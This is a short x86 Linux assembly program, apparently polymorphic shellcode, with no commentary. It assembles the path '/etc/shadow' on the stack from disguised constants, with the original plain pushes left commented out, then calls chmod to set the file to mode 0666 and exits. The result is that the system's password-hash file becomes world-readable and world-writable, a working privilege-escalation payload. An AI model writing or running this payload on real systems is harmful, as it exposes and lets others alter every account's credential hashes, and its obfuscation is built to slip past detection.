section .text

	global _start

_start:

	xor eax, eax
	cwd
;xor edx, edx

	push byte 15
	pop eax
	push edx
	
	push byte 0x77
	push word 0x6f64

;push 0x6168732f
;push 0x6374652f

	mov edi, 0x6168732e
	inc edi
	mov dword [esp-4] ,edi

	mov esi, 0x5263541e
	add esi, 0x11111111
	mov dword [esp-8] ,esi

	sub esp, 8

	mov ebx, esp

	push word 0666Q
	pop ecx
	int 0x80

	push byte 1
	pop eax
	int 0x80
